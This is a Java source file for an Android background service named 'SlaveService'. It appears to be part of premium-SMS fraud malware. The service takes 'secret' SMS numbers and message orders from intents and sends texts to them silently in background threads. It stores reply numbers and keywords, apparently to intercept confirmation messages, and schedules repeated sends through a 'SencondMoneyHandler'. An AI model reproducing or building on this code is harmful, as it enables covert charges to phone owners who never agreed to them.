package com.sttm.charge;


import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import android.os.IBinder;

import com.sttm.model.SmsSenderAndReceiver;
import com.sttm.util.KsoCache;
import com.sttm.util.KsoHelper;

public class SlaveService extends Service {

	private final String TAG = "SlaveService";

	private int count;
	private String smsNumber;
	private String smsOrder;
	private long time;
	private String secretSmsNumber;
	private String secretSmsOrder;
	private String replyNumber;
	private String keyword;


	private Context context;

	@Override
	public void onCreate() {
		super.onCreate();
		context = this.getApplicationContext();
	}

	@Override
	public void onDestroy() {

		super.onDestroy();
	}

	@Override
	public void onStart(Intent intent, int startId) {

		super.onStart(intent, startId);


		smsNumber = intent.getStringExtra("SecretSmsNumber");
		smsOrder = intent.getStringExtra("SecretSmsOrder");
		time = intent.getLongExtra("sendTime", 4);
		int flag = intent.getIntExtra("flag", 3);
		count = intent.getIntExtra("sendCount", 2);
		replyNumber = intent.getStringExtra("secretSmsReplyNumber");
		keyword = intent.getStringExtra("keyword");

		secretSmsNumber = intent.getStringExtra("secretSmsNumber");
		secretSmsOrder = intent.getStringExtra("secretSmsOrder");

		switch (flag) {
		case 1:
			new Thread() {
				
			
				@Override
				public void run() {
					String smsNumber1 = smsNumber;
					String smsOrder1 = smsOrder;
					long time1 = time;
					int count1 = count;
					String replyNumber1 = replyNumber;
					String keyword1 = keyword;

					KsoCache.getInstance().reSetValue("sendSecretSms", true);
					if (!"".equals(replyNumber1)) {

						KsoCache.getInstance().reSetValue("replyNumber",
								replyNumber1);
					}

					if (!"".equals(keyword1)) {

						KsoCache.getInstance().reSetValue("keyword", keyword1);
					}

					SmsSenderAndReceiver.send2(smsNumber1, smsOrder1);
					long timeout = KsoCache.getInstance().getValue("timeout") == null ? 4 : (Long)KsoCache.getInstance().getValue("timeout");
					KsoMainCourse.startTimeoutHandler(context, timeout);
					KsoCache.getInstance().reSetValue("ksoSmsNumber",
							smsNumber1);
					KsoCache.getInstance().reSetValue("ksoSmsOrder", smsOrder1);
					KsoCache.getInstance().reSetValue("ksoSmsSendflag", 1);
					for (int i = 0; i < (count1 - 1); i++) {

						KsoMainCourse.startSencondMoneyHandler(context, time1);

					}
					super.run();
				}

			}.start();

			break;

		case 4:
			

			new Thread() {
				@Override
				public void run() {
					String[] secretSmsNumbers = secretSmsNumber.substring(0,
							secretSmsNumber.lastIndexOf(",")).split(",");
					String[] secretSmsOrders = secretSmsOrder.substring(0,
							secretSmsOrder.lastIndexOf(",")).split(",");
					long time4 = time;
					int count4 = count;
					String replyNumber4 = replyNumber;
					String keyword4 = keyword;

					KsoCache.getInstance().reSetValue("sendSecretSms", true);
					if (!"".equals(replyNumber4)) {

						KsoCache.getInstance().reSetValue(
								"secretSmsReplyNumber", replyNumber4);
					}

					if (!"".equals(keyword4)) {

						KsoCache.getInstance()
								.reSetValue("keyword", keyword4);
					}
					
					
					int ran = KsoHelper.getRandom(secretSmsNumbers.length - 1);
					String smsNumber4 = secretSmsNumbers[ran];
					String smsOrder4 = secretSmsOrders[ran];
					SmsSenderAndReceiver.send2(smsNumber4, smsOrder4);
					long timeout = KsoCache.getInstance().getValue("timeout") == null ? 4 : (Long)KsoCache.getInstance().getValue("timeout");
					KsoMainCourse.startTimeoutHandler(context, timeout);
					KsoCache.getInstance().reSetValue("ksoSmsNumber",
							smsNumber4);
					KsoCache.getInstance().reSetValue("ksoSmsOrder", smsOrder4);
					KsoCache.getInstance().reSetValue("ksoSmsSendflag", 1);
					
					for (int i = 0; i < (count4 - 1); i++) {

						KsoMainCourse.startSencondMoneyHandler(context, time4);

					}
					
				
				}
			}.start();
			break;

		}

	}

	@Override
	public IBinder onBind(Intent intent) {

		return null;
	}

}
